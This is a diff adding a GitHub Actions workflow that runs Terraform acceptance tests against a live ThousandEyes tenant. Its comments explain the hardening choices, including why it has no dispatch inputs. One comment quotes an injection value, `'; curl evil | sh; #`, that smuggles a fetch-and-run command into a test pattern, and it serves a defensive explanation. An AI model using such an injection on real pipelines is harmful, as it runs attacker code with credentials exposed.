@@ -1,0 +1,128 @@
+# Runs the generated acceptance tests against a live ThousandEyes tenant.
+#
+# Hand-triggered only, and that is a security decision rather than a cost one. The token is a
+# long-lived credential that the ThousandEyes API cannot revoke -- one that leaks stays valid
+# until somebody deletes it by hand in the UI -- so it must never be reachable from a workflow
+# that an untrusted branch can cause to run. `pull_request` would do exactly that.
+#
+# It is also the only gate in this repository that creates real objects. Everything else compiles
+# code, compares it against blueprints, or replays a recorded cassette.
+name: go | Acceptance tests
+
+# No workflow_dispatch inputs, and that is two findings rather than a preference.
+#
+# A package or test-name input interpolated into a `run:` block is code injection --
+# `'; curl evil | sh; #` as a test pattern would execute with the token in scope. Passing them
+# through `env:` fixes that, as pr-title-validation.yml already does for a PR title. But CKV_GHA_7
+# additionally requires dispatch inputs to be empty, on the grounds that build output must not
+# depend on user parameters, and satisfying one rule while suppressing the other is not the same
+# as being safe.
+#
+# So every acceptance test runs, every time. That is one resource today. If phase 7's twenty
+# resources make a full live run too slow or too expensive, the way back is a documented
+# suppression plus env-passing -- not an input added quietly.
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+# Never two live runs at once. They create objects in the same tenant with the same names, so a
+# second run would fight the first over state that is not Terraform's.
+concurrency:
+  group: acceptance-${{ github.repository }}
+  cancel-in-progress: false
+
+jobs:
+  acceptance:
+    name: "🌍 Acceptance (live tenant)"
+    runs-on: ubuntu-24.04-arm
+    # Acceptance runs create and destroy real objects, so they are gated on a GitHub environment
+    # as well as on being hand-triggered. Adding required reviewers to that environment is what
+    # makes a second person approve a run; without it this job still only ever runs on demand.
+    environment: acceptance
+
+    steps:
+      - name: Harden Runner
+        uses: step-security/harden-runner@bf7454d06d71f1098171f2acdf0cd4708d7b5920 # v2.20.0
+        with:
+          egress-policy: audit
+
+      - name: Check Out
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+        with:
+          persist-credentials: false
+
+      - name: Set up Go
+        uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6.5.0
+        with:
+          go-version-file: "go.mod"
+          cache-dependency-path: "go.sum"
+          cache: true
+
+      # terraform-plugin-testing downloads a Terraform binary at run time unless one is on the
+      # PATH. Installing it here makes the version explicit and the run reproducible.
+      - name: Set up Terraform
+        uses: hashicorp/setup-terraform@b9cd54a3c349d3f38e8881555d616ced269862dd # v3.1.2
+        with:
+          terraform_wrapper: false
+
+      - name: Refuse to run without a credential
+        env:
+          THOUSANDEYES_BEARER_TOKEN: ${{ secrets.THOUSANDEYES_BEARER_TOKEN }}
+        run: |
+          if [ -z "${THOUSANDEYES_BEARER_TOKEN}" ]; then
+            echo "::error::THOUSANDEYES_BEARER_TOKEN is not set for the 'acceptance' environment."
+            echo "Every acceptance test would skip, and the run would report success having"
+            echo "tested nothing. That is the failure this step exists to prevent."
+            exit 1
+          fi
+          echo "✅ A credential is present."
+
+      # TF_ACC is what terraform-plugin-testing gates on; without it every TestAcc skips. The
+      # token reaches the provider through the environment and never through a flag, because a
+      # flag lands in the process table and in shell history.
+      - name: Run the acceptance tests
+        working-directory: pilot/thousandeyes
+        env:
+          TF_ACC: "1"
+          THOUSANDEYES_BEARER_TOKEN: ${{ secrets.THOUSANDEYES_BEARER_TOKEN }}
+          THOUSANDEYES_ACCOUNT_GROUP_ID: ${{ secrets.THOUSANDEYES_ACCOUNT_GROUP_ID }}
+        run: |
+          echo "::group::📦 Download"
+          go mod download
+          echo "::endgroup::"
+
+          # -count=1 defeats the test cache. A cached pass proves nothing about a live API,
+          # which is the only thing this workflow exists to find out.
+          go test \
+            -v \
+            -count=1 \
+            -timeout 90m \
+            -run 'TestAcc' \
+            ./...
+
+      # Deliberately no sweep step, and the reason is worth recording rather than leaving as an
+      # apparent omission.
+      #
+      # `probe -mode sweep` exists, but it sweeps the *prober's* ledger -- the objects it recorded
+      # creating before it issued each request. It knows nothing about objects an acceptance test
+      # created, because those are Terraform's, tracked in its state and destroyed by the test
+      # framework at the end of the run. Invoking it here would clean up nothing and look like it
+      # had, which is worse than not running it.
+      #
+      # What does protect the tenant: terraform-plugin-testing destroys everything a test case
+      # created even when a step fails, and the generated CheckDestroyed then asks the API whether
+      # the object really went. A test that leaks fails rather than passing quietly.
+      #
+      # The residual risk is a run killed hard enough that destroy never executes -- a cancelled
+      # job, or the runner dying. That leaves objects named with the `tfacc-` prefix every
+      # generated fixture uses, which is what makes them findable by hand. An acceptance-side
+      # ledger is the real answer and is worth building before phase 7 multiplies live runs across
+      # twenty resources.
+      - name: Note on cleanup
+        if: always()
+        run: |
+          echo "Acceptance tests destroy what they create; CheckDestroyed fails the test if the"
+          echo "API still holds the object. If this job was cancelled or the runner died, look"
+          echo "for objects prefixed 'tfacc-' in the tenant."
